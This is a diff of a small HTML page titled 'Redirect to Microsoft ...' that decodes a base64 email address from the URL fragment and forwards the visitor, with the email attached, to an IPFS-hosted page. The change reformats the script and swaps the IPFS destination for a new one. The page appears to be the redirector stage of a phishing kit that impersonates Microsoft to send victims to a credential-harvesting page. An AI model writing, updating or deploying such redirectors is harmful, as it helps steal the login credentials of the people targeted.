@@ -1,32 +1,33 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
 <html>
-<head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Redirect to Microsoft ...</title>
-</head>
-<body>
-<script>
-  function base64Decode(str) {
-    try {
-      return decodeURIComponent(atob(str).split('').map(function(c) {
-        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-      }).join(''));
-    } catch (e) {
-      console.error('Invalid base64 string:', str);
-      return null;
-    }
-  }
 
-  var hash = window.location.hash;
-  if (hash !== "") {
-    hash = hash.substring(1); // Remove the '#' character
-    const email = base64Decode(hash);
-    if (email)
- {
-      window.location.href = "https://bafkreicvdq3ml4n63kunosekkezftygsufuvvzwxe7pxxmmqanaierk5uq.ipfs.dweb.link/#" + email;
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>Redirect to Microsoft ...</title>
+</head>
+
+<body>
+  <script>
+    function base64Decode(str) {
+      try {
+        return decodeURIComponent(atob(str).split('').map(function (c) {
+          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+        }).join(''));
+      } catch (e) {
+        console.error('Invalid base64 string:', str);
+        return null;
+      }
     }
-  }
-</script>
+
+    var hash = window.location.hash;
+    if (hash !== "") {
+      hash = hash.substring(1); // Remove the '#' character
+      const email = base64Decode(hash);
+      if (email) {
+        window.location.href = "https://bafkreifdtxx4at3uwerzp63ikopv44mkbkmipv3uzpbv3q6sd4n3t5i4w4.ipfs.dweb.link/#" + email;
+      }
+    }
+  </script>
 </body>
 
 </html>
